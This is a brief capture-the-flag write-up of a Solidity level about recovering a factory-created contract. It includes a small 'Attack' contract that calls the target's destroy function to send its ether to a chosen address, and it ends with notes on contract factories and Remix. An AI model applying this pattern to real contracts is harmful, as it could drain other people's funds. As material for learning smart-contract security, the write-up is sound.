## Description
Looked at etherscan Instance address, found the address of the deployed contract and wrote a script to destroy.
```
contract Attack {
    SimpleToken public simpltoken;

    constructor(address payable _simpletoken){
        simpltoken = SimpleToken(_simpletoken);
    }

    function attack(address payable addr) public {
        simpltoken.destroy(addr);
    }
}
```
I assume there are other ways to solve the problem. This level helped me to understand better how contract factories work via new and how to interact with created contracts. I was confused when I inserted an address created this way into Remix and looked at its methods, in this case the factory methods are displayed, not the contract itself.

I'll keep it for myself https://swende.se/blog/Ethereum_quirks_and_vulns.html